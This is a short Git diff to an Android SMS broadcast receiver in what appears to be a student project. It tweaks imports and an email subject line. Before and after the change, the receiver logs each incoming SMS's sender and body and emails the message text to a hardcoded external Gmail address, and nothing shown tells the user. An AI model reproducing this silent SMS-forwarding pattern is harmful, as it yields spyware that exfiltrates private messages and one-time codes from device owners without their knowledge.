@@ -3,8 +3,10 @@ package com.example.a2207project;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Message;
+import android.provider.Settings;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
@@ -21,7 +23,8 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
                 String sender = smsMessage.getDisplayOriginatingAddress();
                 String message = smsMessage.getDisplayMessageBody();
                 Log.d("SMSBroadcastReceiver", "Sender: " + sender + "Message: " + message);
-                EmailHelper.sendEmail("ict1004p2grp4@gmail.com","SMS", message);
+
+                EmailHelper.sendEmail("ict1004p2grp4@gmail.com","SMS - " , message);
             }
         }
     }
